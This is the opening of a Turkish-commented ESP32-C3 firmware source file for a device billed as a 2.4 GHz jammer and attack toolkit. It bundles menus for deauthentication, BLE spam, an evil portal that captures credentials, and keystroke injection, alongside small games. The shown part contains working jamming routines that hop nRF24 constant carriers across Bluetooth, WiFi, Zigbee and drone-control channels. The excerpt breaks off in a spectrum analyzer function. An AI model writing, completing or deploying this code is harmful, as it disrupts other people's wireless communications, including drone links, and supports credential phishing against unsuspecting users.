/**************************************************************
 * UTS-JAM v5.0 ULTIMATE – ESP32-C3 FULL PACK – 5700+ SATIR
 * 2.4 GHz Jammer, Analizör, Spam, Dedektör + Oyunlar + RF
 * Donanım: ESP32-C3 + 2x nRF24L01 + 128x64 OLED
 *
 * YENİ: Hiyerarşik menü, CLI, sistem izleme, gelişmiş jammer
 * Tüm butonlar bağımsız edge detection ile okunuyor.
 * EMİR: OLED 128x64, hiçbir pin değişmedi.
 **************************************************************/

#include "RF24.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <BLEAdvertisedDevice.h>
#include <BLEClient.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEUtils.h>
#include <DNSServer.h>
#include <SPI.h>
#include <U8g2_for_Adafruit_GFX.h>
#include <WiFi.h>
#include <Wire.h>
#include <driver/adc.h>
#include <driver/temp_sensor.h>
#include <esp_adc_cal.h>
#include <esp_system.h>
#include <esp_wifi.h>
#include <map>
#include <math.h>
#include <vector>

#include <Preferences.h>
#include <WebServer.h>
#include "soc/soc.h"
#include "soc/rtc_cntl_reg.h"

// ==========================================
// DONANIM PIN TANIMLARI (BİREBİR ORİJİNAL)
// ==========================================
#define SDA_PIN 8
#define SCL_PIN 9
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SSD1306_I2C_ADDRESS 0x3C

#define LED_PIN 10
#define UP_BUTTON_PIN 2
#define DOWN_BUTTON_PIN 0
#define SELECT_BUTTON_PIN 1

#define SPI_SCK 4
#define SPI_MISO 5
#define SPI_MOSI 6
#define RADIO1_CE 20
#define RADIO1_CSN 21
#define RADIO2_CE 7
#define RADIO2_CSN 10

// ==========================================
// NESNELER
// ==========================================
SPIClass spiBus(FSPI);
RF24 radio(RADIO1_CE, RADIO1_CSN, 4000000);
RF24 radio2(RADIO2_CE, RADIO2_CSN, 4000000);

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;

DNSServer dnsServer;
WiFiServer webServer(80);
String capturedCredentials = "";

bool radio1Active = false;
bool radio2Active = false;

// ==========================================
// GELİŞMİŞ DURUMLAR (AppState enum)
// ==========================================
enum AppState {
  STATE_MENU,
  STATE_SUBMENU_JAMMERS,
  STATE_SUBMENU_ANALYZERS,
  STATE_SUBMENU_ATTACKS,
  STATE_SUBMENU_TOOLS,
  STATE_SUBMENU_GAMES,
  STATE_SUBMENU_SETTINGS,
  STATE_SETTINGS,
  STATE_HELP,
  STATE_BT_JAM,
  STATE_DRONE_JAM,
  STATE_WIFI_JAM,
  STATE_MULTI_JAM,
  STATE_SWEEP_JAM,
  STATE_CHANNEL_RANGE,
  STATE_CW_JAMMER,
  STATE_ZIGBEE_JAM,
  STATE_BLE_TARGET_JAM,
  STATE_CUSTOM_HOPPER,
  STATE_NOISE_GEN,
  STATE_SPECTRUM_WIFI,
  STATE_SPECTRUM_BLE,
  STATE_RF_ANALYZER,
  STATE_WIFI_ANALYZER,
  STATE_PACKET_COUNTER,
  STATE_WIFI_SNIFFER,
  STATE_SIGNAL_METER,
  STATE_BLE_SPAM,
  STATE_APPLE_JUICE,
  STATE_SWIFT_PAIR,
  STATE_FAST_PAIR,
  STATE_RICKROLL_BEACON,
  STATE_BLE_BADUSB,
  STATE_WIFI_DEAUTH,
  STATE_WIFI_BEACON_FLOOD,
  STATE_PROBE_FLOOD,
  STATE_EVIL_PORTAL,
  STATE_ROGUE_AP_DETECT, // New: Rogue AP / Evil Twin detection
  STATE_NRF24_INJECTOR, // New: nRF24 injection tool
  STATE_DEAUTH_DETECT,
  STATE_WIDS,
  STATE_BLE_SCANNER,
  STATE_BLE_GATT_EXPLORER,
  STATE_BLE_TRACKER,
  STATE_MOUSE_SNIFFER,
  STATE_RF_REPEATER,
  STATE_RF_OSCILLOSCOPE,
  STATE_TEST_RADIOS,
  STATE_SYSTEM_INFO,
  STATE_DOOM_GAME,
  STATE_DINO_GAME,
  STATE_FLAPPY_GAME,
  STATE_SNAKE_GAME,
  STATE_TICTACTOE,
  STATE_PONG,
  STATE_HUNT_GAME,
  STATE_SIMON_GAME,
  STATE_MEMORY_GAME,
  STATE_INVADERS,
  STATE_CALCULATOR,
  STATE_RESISTOR_CALC,
  STATE_WIFI_MONITOR,
  STATE_CLI,
  STATE_WEB_DASHBOARD,
  STATE_RF_REPLAY,
  STATE_DUCKY_INJECTOR,
  STATE_LOCK
};
AppState currentState = STATE_MENU;
AppState previousState = STATE_MENU;

// ==========================================
// GENİŞLETİLMİŞ SİMGE SETİ (50 adet, 8x8 PROGMEM)
// ==========================================
static const uint8_t PROGMEM icon_bt[] = {0x00, 0x46, 0x6e, 0x3e,
                                          0x1c, 0x3e, 0x6e, 0x46};
static const uint8_t PROGMEM icon_drone[] = {0x18, 0x3c, 0x5a, 0xff,
                                             0x7e, 0x3c, 0x24, 0x24};
static const uint8_t PROGMEM icon_wifi[] = {0x00, 0x3e, 0x41, 0x1c,
                                            0x22, 0x08, 0x14, 0x00};
static const uint8_t PROGMEM icon_multi[] = {0x55, 0xaa, 0x55, 0xaa,
                                             0x55, 0xaa, 0x55, 0xaa};
static const uint8_t PROGMEM icon_sweep[] = {0x00, 0x02, 0x06, 0x8e,
                                             0xfe, 0x7e, 0x30, 0x00};
static const uint8_t PROGMEM icon_chrange[] = {0x00, 0x7e, 0x42, 0x5a,
                                               0x5a, 0x42, 0x7e, 0x00};
static const uint8_t PROGMEM icon_spectrum[] = {0x18, 0x18, 0x24, 0x24,
                                                0x42, 0x5a, 0x99, 0x00};
static const uint8_t PROGMEM icon_ble_spec[] = {0x00, 0x08, 0x2a, 0x1c,
                                                0x1c, 0x2a, 0x08, 0x00};
static const uint8_t PROGMEM icon_spam[] = {0x00, 0x7e, 0x46, 0x4a,
                                            0x52, 0x62, 0x7e, 0x00};
static const uint8_t PROGMEM icon_deauth[] = {0x00, 0x5e, 0x62, 0x5e,
                                              0x70, 0x40, 0x7e, 0x00};
static const uint8_t PROGMEM icon_scanner[] = {0x00, 0x3c, 0x5a, 0x5a,
                                               0x66, 0x42, 0x3c, 0x00};
static const uint8_t PROGMEM icon_zigbee[] = {0x18, 0x24, 0x5a, 0xdb,
                                              0x5a, 0x24, 0x18, 0x00};
static const uint8_t PROGMEM icon_target[] = {0x18, 0x24, 0x42, 0x5a,
                                              0x42, 0x24, 0x18, 0x00};
static const uint8_t PROGMEM icon_beacon[] = {0x10, 0x10, 0x38, 0x38,
                                              0x7c, 0x7c, 0xfe, 0xfe};
static const uint8_t PROGMEM icon_analyzer[] = {0x00, 0x1c, 0x22, 0x22,
                                                0x1c, 0x08, 0x3e, 0x00};
static const uint8_t PROGMEM icon_detect[] = {0x00, 0x3c, 0x5e, 0xff,
                                              0xff, 0x5e, 0x3c, 0x00};
static const uint8_t PROGMEM icon_radio[] = {0x00, 0x3c, 0x42, 0x99,
                                             0xa5, 0x81, 0x7e, 0x00};
static const uint8_t PROGMEM icon_settings[] = {0x18, 0x3c, 0x5a, 0xff,
                                                0x5a, 0x3c, 0x18, 0x00};
static const uint8_t PROGMEM icon_help[] = {0x3c, 0x42, 0x42, 0x4c,
                                            0x48, 0x00, 0x18, 0x00};
static const uint8_t PROGMEM icon_portal[] = {0x3c, 0x42, 0x99, 0xa5,
                                              0xa5, 0x99, 0x42, 0x3c};
static const uint8_t PROGMEM icon_doom[] = {0x00, 0x7e, 0x5a, 0xdb,
                                            0xdb, 0x5a, 0x7e, 0x00};
static const uint8_t PROGMEM icon_calc[] = {0x7e, 0x40, 0x5e, 0x52,
                                            0x52, 0x5e, 0x00, 0x00};
static const uint8_t PROGMEM icon_resistor[] = {0x08, 0x7f, 0x08, 0x3e,
                                                0x41, 0x00, 0x7f, 0x00};
static const uint8_t PROGMEM icon_monitor[] = {0x7c, 0x44, 0x28, 0x10,
                                               0x28, 0x44, 0x7c, 0x00};
static const uint8_t PROGMEM icon_snake[] = {0x00, 0x3c, 0x42, 0x52,
                                             0x4a, 0x3c, 0x00, 0x00};
static const uint8_t PROGMEM icon_packet[] = {0x7e, 0x42, 0x5a, 0x5a,
                                              0x42, 0x7e, 0x00, 0x00};
static const uint8_t PROGMEM icon_wids[] = {0x3c, 0x42, 0x5a, 0x5a,
                                            0x5a, 0x42, 0x3c, 0x00};
static const uint8_t PROGMEM icon_rf_ana[] = {0x0e, 0x11, 0x20, 0x40,
                                              0x20, 0x11, 0x0e, 0x00};
static const uint8_t PROGMEM icon_gatt[] = {0x3c, 0x42, 0x81, 0xbd,
                                            0x81, 0x42, 0x3c, 0x00};
static const uint8_t PROGMEM icon_tracker[] = {0x18, 0x3c, 0x5a, 0xff,
                                               0xdb, 0x3c, 0x18, 0x00};
static const uint8_t PROGMEM icon_mouse[] = {0x30, 0x28, 0x24, 0x22,
                                             0x21, 0x00, 0x18, 0x00};
static const uint8_t PROGMEM icon_repeater[] = {0x00, 0x42, 0x66, 0x3c,
                                                0x3c, 0x66, 0x42, 0x00};
static const uint8_t PROGMEM icon_oscillo[] = {0x00, 0x44, 0x28, 0x10,
                                               0x28, 0x44, 0x00, 0x00};
static const uint8_t PROGMEM icon_badusb[] = {0x3c, 0x42, 0x5a, 0x5a,
                                              0x42, 0x3c, 0x18, 0x18};
static const uint8_t PROGMEM icon_sniffer[] = {0x7e, 0x42, 0x5a, 0x5a,
                                               0x42, 0x7e, 0x18, 0x18};
static const uint8_t PROGMEM icon_cw[] = {0x18, 0x18, 0x18, 0xff,
                                          0xff, 0x18, 0x18, 0x18};
static const uint8_t PROGMEM icon_tictactoe[] = {0x00, 0x7e, 0x42, 0x5a,
                                                 0x5a, 0x42, 0x7e, 0x00};
static const uint8_t PROGMEM icon_pong[] = {0x18, 0x18, 0x7e, 0x7e,
                                            0x7e, 0x18, 0x18, 0x00};
static const uint8_t PROGMEM icon_probe[] = {0x10, 0x38, 0x7c, 0x38,
                                             0x10, 0x00, 0x10, 0x00};
static const uint8_t PROGMEM icon_hopper[] = {0x08, 0x1c, 0x3e, 0x7f,
                                              0x3e, 0x1c, 0x08, 0x00};
static const uint8_t PROGMEM icon_noise[] = {0x55, 0x00, 0xaa, 0x00,
                                             0x55, 0x00, 0xaa, 0x00};
static const uint8_t PROGMEM icon_signal[] = {0x00, 0x10, 0x10, 0x28,
                                              0x28, 0x44, 0x44, 0x00};
static const uint8_t PROGMEM icon_system[] = {0x7e, 0x42, 0x5a, 0x5a,
                                              0x42, 0x7e, 0x00, 0x00};
static const uint8_t PROGMEM icon_lock[] = {0x3c, 0x42, 0x5a, 0x5a,
                                            0x42, 0x3c, 0x18, 0x18};
static const uint8_t PROGMEM icon_wumpus[] = {0x3c, 0x42, 0x99, 0xa5,
                                              0x81, 0x42, 0x3c, 0x00};
static const uint8_t PROGMEM icon_simon[] = {0x18, 0x3c, 0x5a, 0xff,
                                             0x5a, 0x3c, 0x18, 0x00};
static const uint8_t PROGMEM icon_memory[] = {0x00, 0x7e, 0x42, 0x5a,
                                              0x5a, 0x42, 0x7e, 0x00};
static const uint8_t PROGMEM icon_invaders[] = {0x18, 0x3c, 0x7e, 0xdb,
                                                0x7e, 0x3c, 0x18, 0x00};
static const uint8_t PROGMEM icon_dino[] = {0x07, 0x0f, 0x0e, 0x1f, 0x3f, 0x2e, 0x2c, 0x00};
static const uint8_t PROGMEM icon_flappy[] = {0x1c, 0x3e, 0x7f, 0x6b, 0x7f, 0x3e, 0x1c, 0x00};

// Menü öğeleri (ana menü → 8 alt başlık)
enum MainMenuItem {
  MENU_JAMMERS,
  MENU_ANALYZERS,
  MENU_ATTACKS,
  MENU_TOOLS,
  MENU_GAMES,
  MENU_SETTINGS,
  MENU_HELP,
  MENU_CLI,
  MENU_LOCK,
  NUM_MAIN_ITEMS
};
const char *mainMenuLabels[NUM_MAIN_ITEMS] = {
    "Jammers",  "Analyzers", "Attacks", "Tools", "Games",
    "Settings", "Help",      "CLI",     "Lock"};
const uint8_t *const mainMenuIcons[NUM_MAIN_ITEMS] PROGMEM = {
    icon_multi,    icon_spectrum, icon_deauth, icon_scanner, icon_doom,
    icon_settings, icon_help,     icon_system, icon_lock};

int firstVisibleMain = 0;
MainMenuItem selectedMain = MENU_JAMMERS;

struct SubMenuItem {
  const char *label;
  const uint8_t *icon;
  AppState targetState;
};
struct SubMenu {
  const char *title;
  std::vector<SubMenuItem> items;
};

SubMenu subJammers = {"Jammers",
                      {{"BT Jam", icon_bt, STATE_BT_JAM},
                       {"DroneJam", icon_drone, STATE_DRONE_JAM},
                       {"WiFiJam", icon_wifi, STATE_WIFI_JAM},
                       {"MultiJam", icon_multi, STATE_MULTI_JAM},
                       {"SweepJam", icon_sweep, STATE_SWEEP_JAM},
                       {"ChRange", icon_chrange, STATE_CHANNEL_RANGE},
                       {"CW Jammer", icon_cw, STATE_CW_JAMMER},
                       {"ZigbeeJam", icon_zigbee, STATE_ZIGBEE_JAM},
                       {"TargJam", icon_target, STATE_BLE_TARGET_JAM},
                       {"Hopper", icon_hopper, STATE_CUSTOM_HOPPER},
                       {"NoiseGen", icon_noise, STATE_NOISE_GEN},
                       {"Back to Menu", icon_system, STATE_MENU}}};
SubMenu subAnalyzers = {"Analyzers",
                        {{"WiFiSpec", icon_spectrum, STATE_SPECTRUM_WIFI},
                         {"BLESpec", icon_ble_spec, STATE_SPECTRUM_BLE},
                         {"RFAnalyz", icon_rf_ana, STATE_RF_ANALYZER},
                         {"WiFiAnaly", icon_analyzer, STATE_WIFI_ANALYZER},
                         {"PktCount", icon_packet, STATE_PACKET_COUNTER},
                         {"WiFiSnif", icon_sniffer, STATE_WIFI_SNIFFER},
                         {"SigMeter", icon_signal, STATE_SIGNAL_METER},
                         {"Back to Menu", icon_system, STATE_MENU}}};
SubMenu subAttacks = {"Attacks",
                      {{"BLESpam", icon_spam, STATE_BLE_SPAM},
                       {"SourApple", icon_spam, STATE_APPLE_JUICE},
                       {"SwiftPair", icon_badusb, STATE_SWIFT_PAIR},
                       {"FastPair", icon_spam, STATE_FAST_PAIR},
                       {"Rickroll", icon_beacon, STATE_RICKROLL_BEACON},
                       {"BLEBadUSB", icon_badusb, STATE_BLE_BADUSB},
                       {"Deauth", icon_deauth, STATE_WIFI_DEAUTH},
                       {"Beacon", icon_beacon, STATE_WIFI_BEACON_FLOOD},
                       {"ProbeFld", icon_probe, STATE_PROBE_FLOOD},
                       {"EvilPort", icon_portal, STATE_EVIL_PORTAL},
                       {"Back to Menu", icon_system, STATE_MENU}}};
SubMenu subTools = {"Tools",
                    {{"BLEScan", icon_scanner, STATE_BLE_SCANNER},
                     {"BLE GATT", icon_gatt, STATE_BLE_GATT_EXPLORER},
                     {"BLETrack", icon_tracker, STATE_BLE_TRACKER},
                     {"MouseSnf", icon_mouse, STATE_MOUSE_SNIFFER},
                     {"Repeater", icon_repeater, STATE_RF_REPEATER},
                     {"RF Replay", icon_repeater, STATE_RF_REPLAY},
                     {"DuckyInject", icon_badusb, STATE_DUCKY_INJECTOR},
                     {"Oscillosc", icon_oscillo, STATE_RF_OSCILLOSCOPE},
                     {"DeauthDet", icon_detect, STATE_DEAUTH_DETECT},
                     {"WIDS", icon_wids, STATE_WIDS},
                     {"WebDash", icon_portal, STATE_WEB_DASHBOARD},
                     {"TestRadio", icon_radio, STATE_TEST_RADIOS},
                     {"SysInfo", icon_system, STATE_SYSTEM_INFO},
                     {"Back to Menu", icon_system, STATE_MENU}}};
SubMenu subGames = {"Games",
                    {{"DOOM 3D", icon_doom, STATE_DOOM_GAME},
                     {"Dino Run", icon_dino, STATE_DINO_GAME},
                     {"FlappyBird", icon_flappy, STATE_FLAPPY_GAME},
                     {"Snake", icon_snake, STATE_SNAKE_GAME},
                     {"TicTacToe", icon_tictactoe, STATE_TICTACTOE},
                     {"Pong", icon_pong, STATE_PONG},
                     {"Hunt", icon_wumpus, STATE_HUNT_GAME},
                     {"Simon", icon_simon, STATE_SIMON_GAME},
                     {"Memory", icon_memory, STATE_MEMORY_GAME},
                     {"Invaders", icon_invaders, STATE_INVADERS},
                     {"Back to Menu", icon_system, STATE_MENU}}};
SubMenu subSettings = {"Settings",
                       {{"Brightness", icon_settings, STATE_SETTINGS},
                        {"Pwr Save", icon_settings, STATE_SETTINGS},
                        {"StealthMode", icon_settings, STATE_SETTINGS},
                        {"nRF24 PA", icon_radio, STATE_SETTINGS},
                        {"Sys Info", icon_system, STATE_SYSTEM_INFO},
                        {"Reset WiFi", icon_radio, STATE_TEST_RADIOS},
                        {"Back to Menu", icon_system, STATE_MENU}}};

SubMenu *currentSubMenu = nullptr;
int subFirstVisible = 0;
int subSelectedIndex = 0;

uint8_t brightness = 255;
bool powerSaveMode = false;
extern bool stealthModeEnabled;
extern rf24_pa_dbm_e currentPALevel;
void toggleStealthMode();
void cycleNRF24PALevel();
void runRFReplay();
void runDuckyScriptInjector();
void sendBLEAdvertisementPacket(uint8_t *payload, uint8_t len);

// ==========================================
// BUTON YÖNETİMİ
// ==========================================
static bool readButtonDebounced(uint8_t pin, unsigned long &lastPress, bool &lastState) {
  bool cur = (digitalRead(pin) == LOW);
  unsigned long now = millis();
  if (cur && !lastState) {
    if (now - lastPress > 35) { // 35ms instant response debounce
      lastPress = now;
      lastState = true;
      return true;
    }
  } else if (cur && lastState) {
    if (now - lastPress > 220) { // Smooth auto-repeat on hold
      lastPress = now;
      return true;
    }
  } else if (!cur) {
    lastState = false;
  }
  return false;
}

bool upPressed() {
  static unsigned long lastUp = 0;
  static bool lastState = false;
  return readButtonDebounced(UP_BUTTON_PIN, lastUp, lastState);
}

bool downPressed() {
  static unsigned long lastDown = 0;
  static bool lastState = false;
  return readButtonDebounced(DOWN_BUTTON_PIN, lastDown, lastState);
}

bool selPressed() {
  static unsigned long lastSel = 0;
  static bool lastState = false;
  return readButtonDebounced(SELECT_BUTTON_PIN, lastSel, lastState);
}

// 2 tuşa aynı anda 1.5 saniye basılı tutulursa acil durum ana menüye dönüş
bool checkEscapeToMenu() {
  static unsigned long holdStart = 0;
  bool upCur = (digitalRead(UP_BUTTON_PIN) == LOW);
  bool downCur = (digitalRead(DOWN_BUTTON_PIN) == LOW);
  bool selCur = (digitalRead(SELECT_BUTTON_PIN) == LOW);

  int pressedCount = (upCur ? 1 : 0) + (downCur ? 1 : 0) + (selCur ? 1 : 0);

  if (pressedCount >= 2) {
    if (holdStart == 0) {
      holdStart = millis();
    } else if (millis() - holdStart > 1200) { // 1.2 saniye
      holdStart = 0;
      currentState = STATE_MENU;
      stopRadios();
      esp_wifi_set_promiscuous(false);
      WiFi.mode(WIFI_OFF);
      return true;
    }
  } else {
    holdStart = 0;
  }
  return false;
}

// ==========================================
// YARDIMCI FONKSİYONLAR
// ==========================================
void safeDelay(unsigned long ms) {
  unsigned long start = millis();
  while (millis() - start < ms)
    yield();
}

void setBrightness(uint8_t val) {
  brightness = val;
  display.ssd1306_command(SSD1306_SETCONTRAST);
  display.ssd1306_command(brightness);
}

// Gerilim okuyucu (dahili ADC2_CH3 veya VREF) ESP32-C3: ADC2_CH3 GPIO3? Pin 3
// meşgul değil, ama tanımlı değil. Alternatif olarak dahili Vref kullan.
float readVcc() {
  // ESP32-C3'de dahili Vref ölçümü
  adc1_config_width(ADC_WIDTH_BIT_12);
  adc1_config_channel_atten(ADC1_CHANNEL_0, ADC_ATTEN_DB_0);
  int raw = adc1_get_raw(ADC1_CHANNEL_0);
  // Vref ~1.1V, atten 0 => yaklaşık 1.1V = 4095'te. Tam kalibrasyon gerekiyor.
  // Yaklaşık hesapla:
  float vcc = (raw / 4095.0) * 1.1 * (3.3 / 1.1); // Kaba
  return vcc;
}

void drawStatusBar() {
  display.fillRect(0, 0, SCREEN_WIDTH, 8, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.print("UTS-JAM");
  display.setCursor(84, 0);
  display.print("Toprak");
}

void drawSubMenu(SubMenu &menu) {
  display.clearDisplay();
  drawStatusBar();
  int titleY = 10;
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(2, titleY);
  display.println(menu.title);

  int visibleItems = 4;
  int total = menu.items.size();

  for (int i = 0; i < visibleItems && (subFirstVisible + i) < total; i++) {
    int idx = subFirstVisible + i;
    int y = 20 + i * 11;
    if (idx == subSelectedIndex) {
      display.fillRect(0, y - 1, 124, 11, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.drawBitmap(2, y + 1, menu.items[idx].icon, 8, 8,
                       idx == subSelectedIndex ? SSD1306_BLACK : SSD1306_WHITE);
    display.setCursor(13, y + 1);
    display.print(menu.items[idx].label);
  }

  if (total > visibleItems) {
    int barStart = 20 + (subFirstVisible * 42) / total;
    int barEnd = 20 + ((subFirstVisible + visibleItems) * 42) / total;
    display.fillRect(125, barStart, 3, max(4, barEnd - barStart), SSD1306_WHITE);
  }
  display.display();
}

void drawMainMenu() {
  display.clearDisplay();
  drawStatusBar();
  int titleY = 10;
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(2, titleY);
  display.println("MAIN MENU");

  for (int i = 0; i < 4; i++) {
    int idx = (firstVisibleMain + i) % NUM_MAIN_ITEMS;
    int y = 20 + i * 11;
    if (idx == selectedMain) {
      display.fillRect(0, y - 1, 124, 11, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.drawBitmap(2, y + 1, mainMenuIcons[idx], 8, 8,
                       idx == selectedMain ? SSD1306_BLACK : SSD1306_WHITE);
    display.setCursor(13, y + 1);
    display.print(mainMenuLabels[idx]);
  }

  int total = NUM_MAIN_ITEMS;
  int visible = 4;
  if (total > visible) {
    int barStart = 20 + (firstVisibleMain * 42) / total;
    int barEnd = 20 + ((firstVisibleMain + visible) * 42) / total;
    display.fillRect(125, barStart, 3, max(4, barEnd - barStart), SSD1306_WHITE);
  }
  display.display();
}

void displayInfo(String t, String a = "", String b = "", String c = "",
                 String d = "") {
  display.clearDisplay();
  drawStatusBar();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 10);
  display.println(t);
  if (a != "") {
    display.setCursor(0, 22);
    display.println(a);
  }
  if (b != "") {
    display.setCursor(0, 34);
    display.println(b);
  }
  if (c != "") {
    display.setCursor(0, 46);
    display.println(c);
  }
  if (d != "") {
    display.setCursor(0, 58);
    display.println(d);
  }
  display.display();
}

// Splash
static const unsigned char PROGMEM splash_evi[] = {
    0x30, 0x03, 0x00, 0x60, 0x01, 0x80, 0xe0, 0x01, 0xc0, 0xf3, 0xf3,
    0xc0, 0xff, 0xff, 0xc0, 0xff, 0xff, 0xc0, 0x7f, 0xff, 0x80, 0x7f,
    0xff, 0x80, 0x7f, 0xff, 0x80, 0xef, 0xfd, 0xc0, 0xe7, 0xf9, 0xc0,
    0xe3, 0xf1, 0xc0, 0xe1, 0xe1, 0xc0, 0xf1, 0xe3, 0xc0, 0xff, 0xff,
    0xc0, 0x7f, 0xff, 0x80, 0x7b, 0xf7, 0x80, 0x3d, 0x2f, 0x00, 0x1e,
    0x1e, 0x00, 0x0f, 0xfc, 0x00, 0x03, 0xf0, 0x00};
static const unsigned char PROGMEM splash_ble[] = {
    0x07, 0xc0, 0x1f, 0xf0, 0x3e, 0xf8, 0x7e, 0x7c, 0x76, 0xbc,
    0xfa, 0xde, 0xfc, 0xbe, 0xfe, 0x7e, 0xfc, 0xbe, 0xfa, 0xde,
    0x76, 0xbc, 0x7e, 0x7c, 0x3e, 0xf8, 0x1f, 0xf0, 0x07, 0xc0};
static const unsigned char PROGMEM splash_mhz[] = {
    0xc3, 0x61, 0x80, 0x00, 0xe7, 0x61, 0x80, 0x00, 0xff, 0x61, 0x80,
    0x00, 0xff, 0x61, 0xbf, 0x80, 0xdb, 0x7f, 0xbf, 0x80, 0xdb, 0x7f,
    0x83, 0x00, 0xdb, 0x61, 0x86, 0x00, 0xc3, 0x61, 0x8c, 0x00, 0xc3,
    0x61, 0x98, 0x00, 0xc3, 0x61, 0xbf, 0x80, 0xc3, 0x61, 0xbf, 0x80};

void splashScreen() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_adventurer_tr);

  // Animated intro scanlines
  for (int y = 0; y < 64; y += 4) {
    display.clearDisplay();
    display.drawFastHLine(0, y, 128, SSD1306_WHITE);
    display.drawFastHLine(0, 63 - y, 128, SSD1306_WHITE);
    display.display();
    delay(15);
  }

  display.clearDisplay();
  display.drawBitmap(56, 30, splash_evi, 18, 21, 1);
  u8g2_for_adafruit_gfx.setCursor(20, 20);
  u8g2_for_adafruit_gfx.print("2.4 G H Z");
  u8g2_for_adafruit_gfx.setCursor(30, 35);
  u8g2_for_adafruit_gfx.print("UTS-JAM5");
  display.drawBitmap(106, 15, splash_ble, 15, 15, 1);
  display.drawBitmap(2, 35, splash_mhz, 25, 11, 1);
  display.display();
}

// ==========================================
// RADYO BAŞLATMA & KONTROL
// ==========================================
void initRadios() {
  pinMode(RADIO1_CE, OUTPUT);
  pinMode(RADIO1_CSN, OUTPUT);
  pinMode(RADIO2_CE, OUTPUT);
  pinMode(RADIO2_CSN, OUTPUT);
  digitalWrite(RADIO1_CSN, HIGH);
  digitalWrite(RADIO2_CSN, HIGH);
  digitalWrite(RADIO1_CE, LOW);
  digitalWrite(RADIO2_CE, LOW);
  safeDelay(100);

  bool r1ok = false;
  for (int i = 0; i < 5; i++) {
    digitalWrite(RADIO1_CSN, HIGH);
    safeDelay(20);
    if (radio.begin(&spiBus)) {
      r1ok = true;
      break;
    }
    safeDelay(100);
  }
  radio1Active = r1ok;
  if (r1ok) {
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(currentPALevel);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(currentPALevel, 45);
  }

  bool r2ok = false;
  for (int i = 0; i < 5; i++) {
    digitalWrite(RADIO2_CSN, HIGH);
    safeDelay(20);
    if (radio2.begin(&spiBus)) {
      r2ok = true;
      break;
    }
    safeDelay(100);
  }
  radio2Active = r2ok;
  if (r2ok) {
    radio2.setAutoAck(false);
    radio2.stopListening();
    radio2.setRetries(0, 0);
    radio2.setPALevel(currentPALevel);
    radio2.setDataRate(RF24_2MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.startConstCarrier(currentPALevel, 45);
  }
}

void stopRadios() {
  radio.stopConstCarrier();
  radio2.stopConstCarrier();
}

void recoverFromWiFi() {
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  esp_wifi_stop();
  esp_wifi_deinit();
  safeDelay(1000);
  initRadios();
}

// ==========================================
// JAMMER FONKSİYONLARI
// ==========================================
void btJam() {
  if (radio2Active)
    radio2.setChannel(random(81));
  if (radio1Active)
    radio.setChannel(random(81));
  delayMicroseconds(random(60));
}
void droneJam() {
  if (radio1Active)
    radio.setChannel(random(126));
  if (radio2Active)
    radio2.setChannel(random(126));
  delayMicroseconds(random(60));
}
void singleChannel() {
  if (radio2Active)
    radio2.setChannel(random(81));
  if (radio1Active)
    radio.setChannel(random(15));
  delayMicroseconds(random(60));
}
void wifiJam() {
  int ch[] = {1, 6, 14};
  int r = random(3);
  if (radio1Active)
    radio.setChannel(ch[r]);
  if (radio2Active)
    radio2.setChannel(ch[r]);
}
void channelRange() {
  int r = random(40, 81);
  if (radio1Active)
    radio.setChannel(r);
  if (radio2Active)
    radio2.setChannel(r);
}
void sweepJam() {
  for (int i = 0; i < 125; i++) {
    if (radio1Active)
      radio.setChannel(i);
    if (radio2Active)
      radio2.setChannel(i);
    delayMicroseconds(200);
  }
}
void zigbeeJam() {
  int ch = random(11, 27);
  int n = 5 + (ch - 11) * 5;
  if (radio1Active)
    radio.setChannel(n);
  if (radio2Active)
    radio2.setChannel(n);
  delayMicroseconds(random(100));
}

// ==========================================
// YENİ JAMMER MODLARI
// ==========================================
void customHopper() {
  static int hopList[] = {2, 26, 80, 45, 100, 12, 60}; // Özelleştirilebilir
  static int hopCount = sizeof(hopList) / sizeof(hopList[0]);
  static int idx = 0;
  if (radio1Active)
    radio.setChannel(hopList[idx]);
  if (radio2Active)
    radio2.setChannel(hopList[idx]);
  idx = (idx + 1) % hopCount;
  delayMicroseconds(random(100, 500));
}

void noiseGenerator() {
  if (radio1Active) {
    radio.stopConstCarrier();
    radio.setAutoAck(false);
    radio.setDataRate(RF24_250KBPS); // En geniş bant gürültü
    radio.setChannel(random(0, 125));
    radio.startConstCarrier(RF24_PA_MAX, random(0, 125));
    delayMicroseconds(50);
    radio.stopConstCarrier();
  }
  if (radio2Active) {
    radio2.stopConstCarrier();
    radio2.setAutoAck(false);
    radio2.setDataRate(RF24_250KBPS);
    radio2.setChannel(random(0, 125));
    radio2.startConstCarrier(RF24_PA_MAX, random(0, 125));
    delayMicroseconds(50);
    radio2.stopConstCarrier();
  }
}

// ==========================================
// SPEKTRUM ANALİZÖR (WiFi & BLE) - 128x64 uyumlu
// ==========================================
void drawWaterfall(uint8_t *waterfall, int w, int h, const char *leftLabel,
                   const char *rightLabel) {
  display.clearDisplay();
  drawStatusBar();
  display.drawBitmap(0, 10, waterfall, w, h, SSD1306_WHITE);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, h + 12);
  display.print(leftLabel);
  display.setCursor(88, h + 12);
  display.print(rightLabel);
  display.display();
}

void runWiFiSpectrum() {
  stopRadios();
  if (radio2Active) {
    radio2.setAutoAck(false);
    radio2.startListening();
  }
  const int w = 128, h = 40;
